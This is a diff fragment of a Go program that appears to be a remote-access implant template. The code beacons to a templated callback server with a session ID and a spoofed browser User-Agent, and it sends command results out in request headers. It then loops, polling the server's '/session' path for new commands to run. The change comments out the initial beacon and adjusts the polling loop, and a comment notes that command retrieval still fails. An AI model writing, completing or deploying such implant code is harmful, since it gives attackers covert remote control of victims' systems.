@@ -109,22 +109,22 @@ func main() {
 	fmt.Printf(toSend)
 
 	//time.Sleep(10)
-	req, err := http.NewRequest("GET", "{{.CallBack}}/", nil)
-	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"Chromium 110"}}
-	resp, err := client.Do(req)
+//	req, err := http.NewRequest("GET", "{{.CallBack}}/", nil)
+//	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"Chromium 110"}}
+//	resp, err := client.Do(req)
 
-	if err != nil {
-		panic(err)
-	}
+//	if err != nil {
+//		panic(err)
+//	}
 
-	defer resp.Body.Close()
+//	defer resp.Body.Close()
 
 	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
 	for true {
 		// current issue is that we're not retrieving and executing the new ocmmand
-		req, err = http.NewRequest("GET", "{{.CallBack}}/session", nil)
+		req, err := http.NewRequest("GET", "{{.CallBack}}/session", nil)
 		req.Header.Add("APPSESSIONID", uuid)
-		resp, err = client.Do(req)
+		resp, err := client.Do(req)
 		body, err := ioutil.ReadAll(resp.Body)
 		//body = string(body)
 		//fmt.Printf(body)
